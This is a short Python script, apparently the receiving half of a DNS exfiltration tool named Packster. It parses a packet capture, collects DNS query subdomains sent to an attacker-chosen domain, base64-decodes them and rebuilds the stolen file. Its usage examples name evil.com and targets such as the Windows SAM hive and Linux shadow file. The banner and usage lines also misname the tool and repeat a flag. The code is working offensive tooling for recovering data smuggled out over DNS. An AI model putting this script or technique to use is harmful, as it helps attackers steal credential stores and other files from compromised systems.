#!/usr/bin/python3

# Name: Packster
# Created By: Sayan Ray [@barebones90]
# Description: DNS Exfiltration Script

# imports
import base64
import signal
import pyshark
import argparse

BANNER = """
███████╗██╗██╗  ████████╗██████╗ ███████╗
██╔════╝██║██║  ╚══██╔══╝██╔══██╗╚══███╔╝
█████╗  ██║██║     ██║   ██████╔╝  ███╔╝ 
██╔══╝  ██║██║     ██║   ██╔══██╗ ███╔╝  
██║     ██║███████╗██║   ██║  ██║███████╗
╚═╝     ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚══════╝
-----------------------------------------
                    By: Sayan Ray [@BareBones90]
"""

DES = []

def handle(sig, frame):
	# Handle script termination

	print("[-] Exiting...")
	exit()

def decode(text):
	# Return Base64 decoded text
	return base64.b64decode(text.encode())

def process(packet):
	# PyShark filter
	try:
		if packet.dns.qry_name.split('.')[1] == args.address.split('.')[0] and packet.dns.qry_name.split('.')[0] not in DES:
			DES.append(packet.dns.qry_name.split('.')[0])
	except AttributeError: pass

if __name__ == '__main__':
	signal.signal(signal.SIGINT, handle)

	parser = argparse.ArgumentParser(description="Packster .pcap decoder.", usage="%(prog)s -a <address>  -c <capture.pcap> -f <output file>", formatter_class=argparse.RawDescriptionHelpFormatter, epilog = """

Examples:
  python3 filtrz.py -a evil.com -f evil.pcap -f SAM
  python3 filtrz.py -a 10.10.10.10 -f packet.pcap -f shadow
""")
	parser.add_argument("-a", "--address", help="Address to filter. [Exactly same as used in packster]", required=1, metavar='')
	parser.add_argument("-c", "--cap-file", help=".pcap file to filter.", required=1, type=argparse.FileType('r'), dest="cap", metavar='')
	parser.add_argument("-f", "--file", help="Output file name.", required=1, metavar='')
	args = parser.parse_args()

	print(BANNER + "\n")

	print("[>] Filtering...")

	# Open the .pcap in pyshark
	cap = pyshark.FileCapture(args.cap.name, keep_packets=0)
	cap.apply_on_packets(process)

	text = ""
	# Decrypt the basic encryption
	for qry in DES: text += qry[1:-2]

	# Save the file
	open(args.file, 'wb').write(decode(text))
	print("[*] Saved as: " + args.file)
